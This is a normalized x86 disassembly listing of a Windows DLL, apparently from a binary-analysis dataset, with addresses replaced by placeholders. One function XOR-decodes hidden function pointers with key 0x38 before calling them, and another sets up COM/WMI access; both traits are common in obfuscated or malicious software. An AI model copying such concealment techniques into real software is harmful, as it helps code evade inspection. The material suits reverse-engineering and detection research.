retn 0x4
mov ecx [ edi ]
mov eax esi
pop esi
sub eax ecx
pop ebx
pop ebp
retn 0x4
sub_10062dc0
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x4 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
push edi
mov edi [ ebp + 0xc ]
jne r-xdata
mov eax [ ecx + 0x4 ]
mov [ ebp + 0xc ] edx
cmp edx eax
je r-xdata
push esi
mov esi [ edi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
mov edx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
pop edi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ edi ]
cmp ecx [ edx + 0xc ]
jb r-xdata
mov edx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea eax [ ebp + 0xc ]
mov edx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
pop edi
mov esp ebp
pop ebp
retn 0x8
cmp [ eax + 0xc ] esi
jae r-xdata
pop esi
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_10062e30
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push ebx
push esi
xor eax eax
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp + 0x14 ]
mov bl 0x38
push eax
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp + 0xc ] edx
mov edx [ ebp + 0x8 ]
xor [ ebp + 0xc ] bl
xor [ ebp + 0xd ] bl
xor [ ebp + 0xe ] bl
xor [ ebp + 0xf ] bl
push eax
lea ecx [ ebp - 0x1c ]
push ecx
push edx
push eax
push eax
mov [ ebp - 0x1c ] 0xa
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
call [ ebp + 0xc ]
mov esi eax
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov edx [ rw-data ]
mov eax [ ebp - 0x18 ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push eax
call [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_10062ef6
push 0x38
mov eax sub_1007e7ff
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10009450
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_10042119
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_1002a730
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10045daa
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
retn 0x20
sub_10062fe0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081ae6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x248
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ r--data ]
mov edi ecx
movsx ecx [ eax ]
xor ecx 0x3b
and ecx 0xff
lea eax [ ebp - 0x254 ]
push eax
xor edx edx
mov [ ebp - 0x254 ] cx
mov ecx eax
push ecx
mov [ ebp - 0x252 ] dx
mov edx eax
mov eax [ rw-data ]
push edx
push 0x0
push 0x1
push eax
lea eax [ ebp - 0x218 ]
call sub_10024da0
test eax eax
je r-xdata
xor ecx ecx
push 0x4
mov [ ebp - 0x234 ] cx
push r--data
lea ecx [ ebp - 0x234 ]
mov [ ebp - 0x220 ] 0x7
mov [ ebp - 0x224 ] 0x0
call sub_1005e3c0
lea edx [ ebp - 0x234 ]
push edx
lea edx [ ebp - 0x218 ]
lea esi [ ebp - 0x250 ]
mov [ ebp - 0x4 ] 0x0
call sub_10036350
add esp 0x4
push eax
lea ecx [ edi + 0x70 ]
mov [ ebp - 0x4 ] 0x1
call sub_10051390
mov esi 0x8
cmp [ ebp - 0x23c ] esi
jb r-xdata
mov eax 0x1
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x23c ] 0x7
mov [ ebp - 0x240 ] 0x0
mov [ ebp - 0x250 ] cx
cmp [ ebp - 0x220 ] esi
jb r-xdata
mov eax [ ebp - 0x250 ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
xor eax eax
mov edx [ ebp - 0x234 ]
push edx
call sub_10065045
add esp 0x4
sub_10063150
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
cmp [ edx + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x0
jb r-xdata
mov eax edx
mov eax [ edx ]
jmp r-xdata
mov edx [ edx + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
add edx eax
push edx
push eax
push esi
call sub_10039550
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_10063190
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
jmp edx
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x1 ]
mov [ ecx ] edx
movzx eax [ eax ]
retn
sub_100631c0
push esi
mov esi ecx
cmp [ esi + 0xb8 ] 0x0
jne r-xdata
mov eax [ esi + 0x6c ]
push ebx
push edi
push r--data
xor edi edi
lea ecx [ esi + 0x5c ]
call sub_1005e510
test eax eax
jne r-xdata
mov eax 0x64
pop esi
retn
mov edx 0x8
cmp [ esi + 0x70 ] edx
jb r-xdata
cmp [ esi + 0x54 ] 0x8
lea eax [ esi + 0x40 ]
jb r-xdata
lea ecx [ esi + 0x5c ]
mov ecx [ esi + 0x5c ]
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ esi + 0xc8 ]
call eax
jmp r-xdata
mov eax [ eax ]
push 0x0
push 0x0
push ecx
mov ecx [ esi + 0xc8 ]
push 0x3
push eax
call ecx
mov eax [ eax ]
cmp [ esi + 0x54 ] edx
lea eax [ esi + 0x40 ]
jb r-xdata
mov ecx eax
mov [ esi + 0xc0 ] eax
test ecx ecx
jne r-xdata
cmp [ esi + 0x18 ] 0x8
lea eax [ esi + 0x4 ]
jb r-xdata
pop edi
pop ebx
lea eax [ ecx + 0x2 ]
pop esi
retn
movzx edx [ esi + 0x20 ]
push 0x0
push 0x4000000
push 0x3
push 0x0
push 0x0
push edx
push eax
mov eax [ esi + 0xd0 ]
push ecx
call eax
mov [ esi + 0xc4 ] eax
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ esi + 0x6c ]
push r--data
xor edi edi
lea ecx [ esi + 0x5c ]
call sub_1005e510
test eax eax
je r-xdata
mov ecx [ esi + 0xc0 ]
mov edx [ esi + 0xd8 ]
push ecx
call edx
mov [ esi + 0xc0 ] edi
pop edi
pop ebx
mov eax 0x3
pop esi
retn
pop edi
pop ebx
xor eax eax
pop esi
retn
mov eax [ esi + 0x88 ]
lea ebx [ esi + 0x78 ]
push r--data
mov ecx ebx
call sub_1005e510
test eax eax
je r-xdata
mov eax [ esi + 0xa4 ]
lea ebx [ esi + 0x94 ]
push r--data
xor edi edi
mov ecx ebx
call sub_1005e510
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x8
mov eax [ esi + 0x88 ]
jb r-xdata
cmp [ ebx + 0x14 ] 0x8
mov eax [ esi + 0xa4 ]
jb r-xdata
mov ecx [ esi + 0xcc ]
push eax
mov eax [ esi + 0xc4 ]
push ebx
push 0x2b
push eax
call ecx
test eax eax
jne r-xdata
mov ebx [ ebx ]
mov edx [ esi + 0xc4 ]
push eax
mov eax [ esi + 0xcc ]
push ebx
push 0x2c
push edx
call eax
test eax eax
jne r-xdata
mov ebx [ ebx ]
pop edi
pop ebx
mov eax 0x4
pop esi
retn
pop edi
pop ebx
mov eax 0x5
pop esi
retn
sub_1006334a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10019b04
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
pop ecx
sub_10063390
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_10011e8f
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
pop edi
mov [ esi + 0x10 ] ecx
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100633fe
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x4 ]
mov bx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
movzx eax bx
test eax 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_1007cbd5
movzx eax ax
mov [ ebp - 0x8 ] eax
fldcw [ ebp - 0x8 ]
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_1007cc63
push eax
mov [ ebp - 0xc ] eax
call sub_10051efc
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_10063710
push 0xe0
mov eax sub_1007ecbb
call sub_10007703
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xa4 ] eax
movzx eax [ ebp + 0x1c ]
mov esi ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x90 ] ecx
mov [ ebp - 0x94 ] eax
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x14 ] bl
je r-xdata
lea eax [ ebp - 0xac ]
push eax
call sub_10009450
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10030263
pop ecx
mov edi eax
mov [ ebp - 0x88 ] eax
lea ecx [ ebp - 0xac ]
lea eax [ ebp - 0xa8 ]
push eax
call sub_10009450
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10037fc8
mov edi eax
pop ecx
mov [ ebp - 0x88 ] edi
lea ecx [ ebp - 0xa8 ]
jmp r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
sub eax [ ebp + 0x34 ]
push esi
inc eax
push eax
push ebx
lea ecx [ ebp + 0x24 ]
call sub_10054ac3
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
call sub_1002a730
add esi 0x8
push esi
push ebx
push 0x30
call sub_1005e05a
movzx esi ax
add esp 0xc
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
mov [ ebp - 0x98 ] esi
call sub_1002a674
mov eax [ edi ]
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cdq
xor eax edx
sub eax edx
mov [ ebp - 0x8c ] eax
cmp [ ebp + 0x34 ] eax
ja r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
and [ ebp - 0x1c ] 0x0
push 0x7
pop edi
xor eax eax
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] ax
cmp [ ebp + 0x20 ] 0x0
mov esi [ ebp - 0x88 ]
mov eax [ esi ]
lea ecx [ ebp - 0x84 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx esi
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx esi
call sub_10039e87
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx esi
call sub_100171f8
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
mov edi [ ebp - 0x8c ]
xor bl bl
xor edx edx
xor ecx ecx
mov ecx [ ebp - 0x88 ]
lea eax [ ebp - 0x80 ]
push eax
call sub_10020962
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_1003a25a
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x7
call sub_1004dbe5
push eax
lea ecx [ ebp - 0x2c ]
call sub_1003a25a
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
call sub_1004dbe5
and [ ebp - 0x54 ] 0x0
xor eax eax
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x64 ] ax
mov eax [ ebp - 0x90 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov ecx [ ebp - 0x88 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp [ ebp - 0x34 ] 0x10
mov edi [ ebp - 0x48 ]
movzx ebx ax
jae r-xdata
inc edx
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x34 ]
sub esi [ ebp - 0x8c ]
jmp r-xdata
lea edi [ ebp - 0x48 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov bl 0x1
add edx [ ebp - 0x54 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov al [ edi ]
cmp al 0x7f
jne r-xdata
movsx eax [ ebp + ecx - 0x84 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x90 ]
cmp [ ecx + 0x24 ] 0x0
mov eax [ ecx + 0x20 ]
jl r-xdata
add edx [ ebp - 0x1c ]
jmp r-xdata
sub eax 0x4b
je r-xdata
test al al
jle r-xdata
xor esi esi
jg r-xdata
cmp [ ebp + 0x34 ] edi
ja r-xdata
dec eax
dec eax
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
xor ebx ebx
cmp eax 0x100
jne r-xdata
cmp eax edx
jbe r-xdata
test eax eax
je r-xdata
xor eax eax
mov eax edi
sub eax [ ebp + 0x34 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
push ebx
sub esi eax
push 0x1
push esi
lea ecx [ ebp + 0x24 ]
call sub_10054ac3
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
push [ ebp - 0x94 ]
mov [ ebp - 0xa0 ] eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x9c ] eax
call sub_1002836c
mov eax [ ebp - 0xa0 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push esi
push [ ebp - 0x94 ]
lea eax [ ebp - 0xa0 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1001f2a8
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor esi esi
test bl bl
jne r-xdata
sub eax edx
mov esi eax
jmp r-xdata
xor esi esi
cmp esi edi
sbb esi esi
neg esi
add esi [ ebp + 0x34 ]
add esi eax
add edx esi
jmp r-xdata
mov edi eax
inc ebx
cmp ebx 0x4
jb r-xdata
push esi
push [ ebp - 0x94 ]
lea eax [ ebp - 0xb4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1001f2a8
add esp 0x14
xor esi esi
cmp [ ebp - 0x50 ] 0x8
mov eax [ ebp - 0x64 ]
jae r-xdata
sub eax 0x7
je r-xdata
mov eax ecx
mov eax [ eax + 0x14 ]
and eax 0x1c0
mov [ ebp - 0x8c ] eax
cmp eax 0x40
je r-xdata
movsx eax [ ebp + ebx - 0x84 ]
sub eax 0x20
je r-xdata
cmp [ ebp - 0x1c ] 0x1
jbe r-xdata
push [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0xe4 ]
jmp r-xdata
lea eax [ ebp - 0x64 ]
cmp [ ebp - 0x1c ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x90 ]
push esi
push [ ebp - 0x94 ]
xor edi edi
push [ ebp + 0x10 ]
mov [ eax + 0x20 ] edi
push [ ebp + 0xc ]
mov [ eax + 0x24 ] edi
push [ ebp - 0xa4 ]
call sub_1001f2a8
add esp 0x14
xor esi esi
push edi
inc esi
push esi
lea ecx [ ebp - 0x64 ]
call sub_1004dbe5
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_1004dbe5
push edi
push esi
lea ecx [ ebp - 0x48 ]
call sub_1001c5c0
push edi
push esi
lea ecx [ ebp + 0x24 ]
call sub_1004dbe5
mov eax [ ebp - 0xa4 ]
call sub_10019c00
retn 0x38
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
test edi edi
jne r-xdata
dec eax
dec eax
je r-xdata
mov ecx [ ebp - 0x1c ]
add eax 0x2
dec ecx
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xb4 ]
push [ ebp + 0xc ]
push eax
call sub_10012101
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
push 0x1
push eax
lea eax [ ebp - 0xec ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp + 0x34 ] edi
ja r-xdata
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
cmp [ ebp - 0x8c ] 0x100
jne r-xdata
jmp r-xdata
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
push [ ebp - 0x98 ]
lea ecx [ ebp + 0xc ]
call sub_1002836c
mov ecx [ ebp - 0x88 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_1002836c
mov eax edi
sub eax [ ebp + 0x34 ]
push eax
push [ ebp - 0x98 ]
lea eax [ ebp - 0xd4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1001f2a8
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x14
cmp [ ebp + 0x38 ] 0x8
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x24 ]
jae r-xdata
push [ ebp + 0x34 ]
push eax
lea eax [ ebp - 0xbc ]
lea eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x34 ]
sub ecx edi
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xcc ]
push [ ebp + 0xc ]
push eax
call sub_10012101
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x88 ]
mov [ ebp + 0x10 ] eax
mov eax [ ecx ]
add esp 0x14
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_1002836c
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
lea eax [ ebp + 0x24 ]
push [ ebp + 0x34 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xc4 ]
jmp r-xdata
lea ecx [ ebp + 0x24 ]
mov ecx [ ebp + 0x34 ]
sub ecx edi
lea eax [ eax + ecx * 2 ]
push edi
push eax
lea eax [ ebp - 0xdc ]
jmp r-xdata
lea eax [ ebp + 0x24 ]
push eax
call sub_10012101
add esp 0x14
jmp r-xdata
sub_10063c90
push ebp
mov ebp esp
push 0xffffffff
push sub_10081e39
mov eax [ fs : 0x0 ]
push eax
sub esp 0xf0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
cmp [ edx + 0x8 ] 0x6
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xd8 ] eax
mov [ ebp - 0xe4 ] ecx
jne r-xdata
lea edx [ ebp - 0x40 ]
mov eax 0x7
call sub_10036cd0
lea eax [ ebp - 0xc4 ]
lea edi [ ebp - 0x40 ]
mov ecx eax
sub edi ecx
mov edx 0x32
xor esi esi
lea edx [ ebp - 0x40 ]
mov eax 0x2a
call sub_10036cd0
lea eax [ ebp - 0xc4 ]
lea edi [ ebp - 0x40 ]
mov ecx eax
sub edi ecx
mov edx 0x32
xor esi esi
cmp edx esi
jne r-xdata
movzx ecx [ edi + eax ]
cmp cx si
je r-xdata
movzx ecx [ edi + eax ]
cmp cx si
je r-xdata
push esi
xor edx edx
push esi
mov [ eax ] dx
call [ CoInitializeEx@IAT ]
cmp eax esi
je r-xdata
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0xc8 ]
push eax
push r--data
push 0x1
push esi
push r--data
call [ CoCreateInstance@IAT ]
cmp eax esi
je r-xdata
cmp eax 0x1
je r-xdata
lea ecx [ edx + 0x7fffffcc ]
test ecx ecx
je r-xdata
jmp r-xdata
lea ecx [ edx + 0x7fffffcc ]
test ecx ecx
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0xd4 ]
push ecx
lea edi [ ebp - 0xc4 ]
call sub_100285a0
mov [ ebp - 0x4 ] esi
mov eax [ eax ]
cmp eax esi
je r-xdata
call [ CoUninitialize@IAT ]
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
cmp ebx esi
je r-xdata
mov edi eax
add eax 0x8
push eax
call [ InterlockedDecrement@IAT ]
cmp eax esi
jne r-xdata
mov eax [ ebp - 0xc8 ]
mov edx [ eax ]
lea edi [ ebp - 0xcc ]
push edi
push esi
push esi
push esi
push esi
push esi
push esi
push ecx
push eax
mov eax [ edx + 0xc ]
call eax
mov ebx eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0xd4 ]
cmp eax esi
je r-xdata
mov eax [ ebp - 0xcc ]
push esi
push esi
push 0x3
push 0x3
push esi
push esi
push 0xa
push eax
call [ CoSetProxyBlanket@IAT ]
cmp eax esi
je r-xdata
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x4
jmp r-xdata
cmp edi esi
je r-xdata
lea edi [ ebp - 0xe0 ]
mov eax 0x14
call sub_100211a0
mov edi [ ebp - 0xd8 ]
lea eax [ ebp - 0xd4 ]
push eax
call sub_100285a0
mov edi eax
lea ecx [ ebp - 0xe0 ]
push ecx
lea ebx [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0x1
call sub_1005b930
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
cmp ecx esi
je r-xdata
mov eax [ ebp - 0xcc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x5
jmp r-xdata
mov eax [ edi ]
